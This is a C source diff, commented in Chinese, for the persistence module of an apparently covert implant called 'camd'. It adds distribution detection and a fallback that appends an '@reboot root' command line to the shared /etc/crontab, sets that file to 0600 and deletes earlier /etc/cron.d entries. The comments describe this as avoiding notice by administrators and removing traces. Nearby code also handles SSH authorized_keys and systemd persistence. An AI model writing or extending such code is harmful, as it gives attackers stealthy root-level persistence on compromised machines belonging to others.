@@ -221,6 +221,133 @@ size_t persist_generate(persist_method_t m, const char *arg, char *out, size_t c
     return (size_t)n;
 }
 
+/* ---------- cron 落点：能力探测 + 回退 ----------
+ *
+ * 【实测踩出来的硬事实】/etc/cron.d **不是通用特性**，而是 Debian/RHEL 对
+ * cron 打的发行版补丁。上游真 Vixie cron（V4.999）的 pathnames.h 只有
+ * CRON_DENY、没有 CRON_DIR，压根不扫描该目录。本仓实测对照（21_exfil/
+ * tests/verify_cron_impl.py、redline/verify_r3_cron.py）：
+ *
+ *   /etc/cron.d/probe_d（R3a 契约全合规、0600）→ 从未执行，日志零提及
+ *   /etc/crontab（同内容、0600）              → 真触发，status=0000
+ *
+ * 正对照成立，所以"cron.d 没跑"不等于"cron 没起来"。危害具体到驻留上：
+ * 条目写了、权限对、契约全过、部署报告全绿，而在 Vixie/BSD/Alpine 系
+ * 目标机上**永远不执行** —— 与"驻留成功"完全无法区分。
+ *
+ * 部署侧（onekey.sh）已做探测与回退，但此处（camd 内部 persist，含周期性
+ * 自检 cd_persist_audit）此前固定写 "%s/etc/cron.d/%s"。后果是**链路被
+ * 抵消**：部署脚本装对了，常驻进程跑一轮自检又把条目写回永不执行的路径。
+ * 随机目标上这类缺陷最难发现 —— Debian 系完全不可见，只在小众目标暴露。
+ *
+ * 【为什么不能用"目录是否存在"当判据】本环境 /etc/cron.d 目录存在，而
+ * cron 不扫描它。目录存在 ≠ 实现支持。判据只能是发行版特征。
+ *
+ * 【为什么默认（未知）走 /etc/crontab】/etc/crontab 是 cron 最古老的机制，
+ * Vixie、cronie、Debian cron 都读；/etc/cron.d 是后来加的补丁。随机目标
+ * 上"未知发行版"更可能是 BSD/嵌入式/小众 Linux，这些更可能不支持 cron.d。
+ * 所以：只有**明确确认**支持才用 cron.d，否则走通用路径。
+ *
+ * 【两种形态的写入语义根本不同】cron.d 是独占文件、整体覆写；/etc/crontab
+ * 是**共享文件**、必须按 marker 追加一行并按 marker 移除，否则会破坏运维
+ * 自己的条目。这与 PERSIST_SSHKEY 完全同形，故复用同一套 marker 函数。
+ *
+ * 【显式覆盖位不可省】"该实现不支持 /etc/cron.d"这条分支在 Debian/RHEL 系
+ * 机器上永远走不到 —— 守卫若不能强制进入它，回退路径就从未被真正执行过，
+ * 等于没写。故提供 persist_set_cron_impl() 与环境变量 PERSIST_CRON_IMPL，
+ * 生产环境从不设置，只服务于守卫。 */
+#define CRON_IMPL_SYSCRONTAB PERSIST_CRON_IMPL_SYSCRONTAB
+#define CRON_IMPL_CROND      PERSIST_CRON_IMPL_CROND
+
+static int g_cron_impl_override = -1;   /* -1 = 自动探测 */
+
+int persist_set_cron_impl(int impl)
+{
+    /* -1 = 复位为自动探测。不可复位会让守卫内多个场景互相污染：override 是
+     * 进程级静态量，设过一次之后后续所有断言都读它，探测逻辑本身再也测不到。 */
+    if (impl != -1 && impl != CRON_IMPL_SYSCRONTAB && impl != CRON_IMPL_CROND)
+        return -1;
+    g_cron_impl_override = impl;
+    return 0;
+}
+
+static int path_exists(const char *p) {
+    struct stat st;
+    return stat(p, &st) == 0;
+}
+
+/* 解析 <rp>/etc/os-release 的 ID= 值。只关心 ID 首行，不去实现完整 ini
+ * 解析 —— 那是典型的"为了一个字段引入一套解析器"，多一处出错面。 */
+static int osrelease_id_supports_crond(const char *rp)
+{
+    static const char *ids[] = {
+        "debian", "ubuntu", "raspbian", "rhel", "centos", "fedora",
+        "rocky", "almalinux", "amzn", "opensuse", "opensuse-leap",
+        "opensuse-tumbleweed", "sles", "suse", NULL
+    };
+    char p[512];
+    snprintf(p, sizeof p, "%s/etc/os-release", rp);
+    FILE *f = fopen(p, "r");
+    if (!f) return 0;
+    char line[512];
+    int hit = 0;
+    while (!hit && fgets(line, sizeof line, f)) {
+        if (strncmp(line, "ID=", 3) != 0) continue;
+        char *v = line + 3;
+        while (*v == ' ' || *v == '\t') v++;
+        if (*v == '"' || *v == '\'') {
+            char q = *v++;
+            char *e = strchr(v, q);
+            if (e) *e = '\0';
+        } else {
+            char *e = v + strlen(v);
+            while (e > v && (e[-1] == '\n' || e[-1] == '\r' ||
+                             e[-1] == ' ' || e[-1] == '\t')) *--e = '\0';
+        }
+        for (int i = 0; ids[i]; i++)
+            if (strcmp(v, ids[i]) == 0) { hit = 1; break; }
+    }
+    fclose(f);
+    return hit;
+}
+
+/* 探测当前目标（真实根或假根）的 cron 实现形态 */
+static int detect_cron_impl(const char *rp)
+{
+    if (g_cron_impl_override == CRON_IMPL_CROND ||
+        g_cron_impl_override == CRON_IMPL_SYSCRONTAB)
+        return g_cron_impl_override;
+
+    const char *env = getenv("PERSIST_CRON_IMPL");
+    if (env && *env) {
+        if (strcmp(env, "crond") == 0 || strcmp(env, "cron.d") == 0)
+            return CRON_IMPL_CROND;
+        if (strcmp(env, "syscrontab") == 0 || strcmp(env, "crontab") == 0)
+            return CRON_IMPL_SYSCRONTAB;
+    }
+
+    char p[512];
+    /* 已知不支持 /etc/cron.d */
+    snprintf(p, sizeof p, "%s/etc/alpine-release", rp);
+    if (path_exists(p)) return CRON_IMPL_SYSCRONTAB;
+    /* 已知支持（与 onekey.sh 的 cron_supports_crond_dir 判据保持一致，
+     * 两处判据必须同源，否则会出现"部署侧回退、运行时侧写回"的抵消） */
+    snprintf(p, sizeof p, "%s/etc/debian_version", rp);
+    if (path_exists(p)) return CRON_IMPL_CROND;
+    snprintf(p, sizeof p, "%s/etc/redhat-release", rp);
+    if (path_exists(p)) return CRON_IMPL_CROND;
+    snprintf(p, sizeof p, "%s/etc/centos-release", rp);
+    if (path_exists(p)) return CRON_IMPL_CROND;
+    if (osrelease_id_supports_crond(rp)) return CRON_IMPL_CROND;
+    /* 未知：保守走通用路径 */
+    return CRON_IMPL_SYSCRONTAB;
+}
+
+int persist_cron_impl(const char *root_prefix)
+{
+    return detect_cron_impl(root_prefix ? root_prefix : "");
+}
+
 /* ---------- 路径助手：真实系统路径（可挂 root_prefix） ---------- */
 static int artifact_path(persist_method_t m, const char *root_prefix,
                          char *out, size_t cap, int *needs_marker)
@@ -234,8 +361,13 @@ static int artifact_path(persist_method_t m, const char *root_prefix,
             if (needs_marker) *needs_marker = 0;
             return 0;
         case PERSIST_CRON:
-            snprintf(out, cap, "%s/etc/cron.d/%s", rp, g_svc_name);
-            if (needs_marker) *needs_marker = 0;
+            if (detect_cron_impl(rp) == CRON_IMPL_CROND) {
+                snprintf(out, cap, "%s/etc/cron.d/%s", rp, g_svc_name);
+                if (needs_marker) *needs_marker = 0;      /* 独占文件 */
+            } else {
+                snprintf(out, cap, "%s/etc/crontab", rp);
+                if (needs_marker) *needs_marker = 1;      /* 共享文件 */
+            }
             return 0;
         case PERSIST_SSHKEY:
             snprintf(out, cap, "%s%s/.ssh/authorized_keys", rp, home);
@@ -351,10 +483,37 @@ int persist_install(persist_method_t m, const char *root_prefix, const char *arg
         return append_marker_line(path, MARKER, full);
     }
 
+    /* cron 回退形态：追加到共享的 /etc/crontab，按 marker 管理，绝不整体
+     * 覆写 —— 覆写会删掉运维自己的条目，那比不驻留更惹眼。
+     *
+     * 两个必须踩对的点（都是实测踩出来的）：
+     *   1) 必须带 user 字段（root）。/etc/crontab 的语法与 cron.d 不同，
+     *      缺 user 字段会被当成 user="/path/cmd" 报 bad username。
+     *   2) 必须 chmod 0600。真 Vixie cron 的加载判据是
+     *      (st_mode & 07777) != 0600 即拒绝，而多数系统 /etc/crontab 默认
+     *      0644 —— 不修同样静默失效，且症状与"条目写错"无法区分。 */
+    if (m == PERSIST_CRON && needs_marker) {
+        char full[4200];
+        snprintf(full, sizeof full, "@reboot root %s  %s\n", arg, MARKER);
+        if (append_marker_line(path, MARKER, full) != 0) return -1;
+        chmod(path, 0600);
+        /* 若此前（含部署侧）写过 cron.d 条目，删除：该形态在本实现下无执行
+         * 可能，留着是纯痕迹，且卸载时按当前形态查不到它。 */
+        char cd[512];
+        snprintf(cd, sizeof cd, "%s/etc/cron.d/%s",
+                 root_prefix ? root_prefix : "", g_svc_name);
+        unlink(cd);
+        return 0;
+    }
+
     char buf[4096];
     size_t n = persist_generate(m, arg, buf, sizeof buf);
     if (n == 0) return -1;
     if (write_file(path, buf, n) != 0) return -1;
+
+    /* cron.d 形态：同样是 0600。Debian cron 要求不可 group/other 可写，
+     * 0600 在所有支持该目录的实现上都成立。 */
+    if (m == PERSIST_CRON) chmod(path, 0600);
 
     /* systemd：写 unit 后建立 wants 符号链接（等价于 systemctl enable） */
     if (m == PERSIST_SYSTEMD) {
@@ -376,6 +535,24 @@ int persist_uninstall(persist_method_t m, const char *root_prefix, const char *a
         return -2;
     struct stat st;
     if (m == PERSIST_SSHKEY) return filter_out_marker(path, MARKER);
+    if (m == PERSIST_CRON) {
+        /* 两种形态**无条件都清**，不看当前探测到的是哪一种。
+         *
+         * 只看当前形态是不够的，这是本轮被自己的守卫抓出来的：探测结果随
+         * 发行版特征变化，而落盘痕迹是历史累积的 —— 装的时候是 A 形态、
+         * 卸的时候探测成 B 形态，只清 B 就会把 A 那条留在盘上，而它恰是
+         * "重启后自启"的那一条。卸载的目的就是清除痕迹，漏一条等于没卸，
+         * 且报告照样报"成功"。
+         *
+         * /etc/crontab 是共享文件，只能按 marker 删行，绝不删文件本身。 */
+        const char *rp = root_prefix ? root_prefix : "";
+        char cd[512], ct[512];
+        snprintf(cd, sizeof cd, "%s/etc/cron.d/%s", rp, g_svc_name);
+        snprintf(ct, sizeof ct, "%s/etc/crontab", rp);
+        unlink(cd);
+        if (filter_out_marker(ct, MARKER) != 0) return -1;
+        if (needs_marker) return 0;      /* 当前形态即 crontab，已清 */
+    }
     if (m == PERSIST_SYSTEMD) {
         const char *rp = root_prefix ? root_prefix : "";
         char link[640];
